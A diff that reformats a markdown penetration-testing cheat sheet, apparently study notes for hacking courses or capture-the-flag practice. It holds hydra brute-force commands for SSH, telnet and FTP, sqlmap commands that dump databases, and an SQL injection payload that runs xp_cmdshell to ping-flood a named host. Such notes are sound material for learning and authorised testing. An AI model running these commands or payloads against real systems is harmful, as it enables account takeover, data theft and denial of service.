@@ -35,39 +35,50 @@ we need to make folder -> store wordlist into that -> run msf from that folder |
 >set SMBUser name [of the user] | (generally Administrator is username)
 >run
 ```
-=== Bruteforce SSH, TELNET, FTP  ===
+# Bruteforce SSH, TELNET, FTP  
 
+## SSH
+```console
 hydra -l username -P passlist.txt x.x.x.x ssh
 hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
-
+```
+## FTP
+```console
 hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x
 
-•	If the service isn't running on the default port, use -s
+• If the service isn't running on the default port, use -s
 hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221
 
-	
-•	Used to download the specific file from FTP to attacker or local machine
+• Used to download the specific file from FTP to attacker or local machine
 get flag.txt ~/Desktop/filepath/flag.txt
+```
 
+# Vulnerability Scanning 
 
-==== Vulnerability Scanning ====
-
-1) Nessus
-
+##  Nessus
+```console
 Nessus runs on https[:]//localhost[:]8834
+```
 
-2) nikto -h 
+##  nikto -h 
+```console
 
-===== Hidden text ====
+```
+# Hidden text
 
-1) snow -C -p "magic" readme2.txt
+## Snow
 
-2) steghide 
+```console
+snow -C -p "magic" readme2.txt
+```
 
-==== WIRESHARK ====
+## steghide 
+```console
+```
 
+# WIRESHARK
 
-
+```console
 To find DOS (SYN and ACK) : 
 •	tcp.flags.syn == 1 , tcp.flags.syn == 1 and tcp.flags.ack == 0
 
@@ -76,12 +87,13 @@ To find Wireshark DOS attack:
 
 View Flood attack on victim via Wireshark 
 •	| use filter tcp.port=21
-
+```
 
 https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
 
-====== SQL ======
+# SQL 
 
+```console
 SQLMAP Extract DBS
 •	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs
 
@@ -108,7 +120,7 @@ Create database from login
 
 Execute cmd from login
 •	blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
-
+```
 
 === PASSWORD CRACKING ===
 
